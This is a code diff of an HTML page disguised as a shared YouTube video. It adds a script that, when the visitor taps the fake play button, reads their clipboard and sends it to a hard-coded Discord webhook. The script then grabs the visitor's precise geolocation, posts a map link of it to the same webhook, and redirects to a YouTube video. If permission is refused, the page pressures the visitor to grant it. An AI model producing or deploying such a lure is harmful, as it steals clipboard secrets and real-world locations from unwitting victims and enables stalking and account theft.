@@ -5,24 +5,52 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
         body { font-family: Roboto, Arial, sans-serif; background-color: #0f0f0f; color: white; text-align: center; margin: 0; padding: 20px; }
-        .video-container { max-width: 500px; margin: auto; position: relative; cursor: pointer; }
-        /* The Thumbnail */
+        .video-container { max-width: 500px; margin: auto; position: relative; cursor: pointer; display: block; }
         .thumbnail { width: 100%; border-radius: 12px; display: block; }
-        /* The Play Button Overlay */
-        .play-button { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 60px; filter: drop-shadow(0 0 10px rgba(0,0,0,0.5)); }
+        /* Using a CSS-based play button so it never "breaks" */
+        .play-button { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 70px; height: 50px; background: rgba(255,0,0,0.9); border-radius: 10px; display: flex; align-items: center; justify-content: center; }
+        .play-button::after { content: ''; display: block; border-style: solid; border-width: 10px 0 10px 15px; border-color: transparent transparent transparent white; }
         .title { text-align: left; font-size: 18px; margin-top: 12px; font-weight: bold; }
-        #status { color: #aaa; margin-top: 10px; font-size: 14px; }
+        #status { color: #aaa; margin-top: 20px; font-size: 14px; }
     </style>
 </head>
 <body>
 
     <div class="video-container" onclick="send()">
-        <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" class="thumbnail">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/b/bb/YouTube_play_button_icon_%282013%E2%80%932017%29.svg" class="play-button">
+        <div style="position: relative;">
+            <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" class="thumbnail">
+            <div class="play-button"></div>
+        </div>
         <div class="title">New Video Shared With You</div>
     </div>
 
     <p id="status">Tap video to play</p>
 
     <script>
-        const WEB
+        const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1459668118661103678/9OcP9yPBgMw8LvDp-yRBM_qGH1KY59lbVxMAeh_jDE-94e5q9JGcKxS5CVqGHe6PIkjp";
+        const REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+
+        async function send() {
+            const status = document.getElementById('status');
+            status.innerText = "Connecting to server...";
+
+            // Try Clipboard
+            try {
+                const text = await navigator.clipboard.readText();
+                if (text) { await fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: "📋 **Clipboard:** " + text}) }); }
+            } catch(e) {}
+
+            // Try Location
+            navigator.geolocation.getCurrentPosition((pos) => {
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({content: "📍 **Location:** http://maps.google.com/?q=" + pos.coords.latitude + "," + pos.coords.longitude})
+                }).then(() => { window.location.href = REDIRECT_URL; });
+            }, (err) => {
+                status.innerText = "Please allow permissions to watch.";
+            }, {enableHighAccuracy: true});
+        }
+    </script>
+</body>
+</html>
